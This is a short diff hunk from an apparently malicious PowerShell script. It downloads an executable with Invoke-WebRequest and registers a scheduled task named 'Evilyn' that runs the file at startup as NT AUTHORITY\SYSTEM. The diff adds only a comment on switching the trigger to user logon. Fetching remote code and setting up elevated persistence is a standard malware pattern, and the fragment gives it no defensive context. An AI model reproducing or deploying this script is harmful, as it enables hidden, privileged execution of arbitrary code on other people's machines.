@@ -9,6 +9,7 @@ Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath
 
 # Create a scheduled task to run the executable at startup with administrator privileges
 $taskAction = New-ScheduledTaskAction -Execute "$destinationPath"
+# If you want the task to execute every time a user logs in, you can change the -AtStartup parameter to -AtLogon
 $taskTrigger = New-ScheduledTaskTrigger -AtStartup
 $taskName = "Evilyn"
 $systemUser = "NT AUTHORITY\SYSTEM"
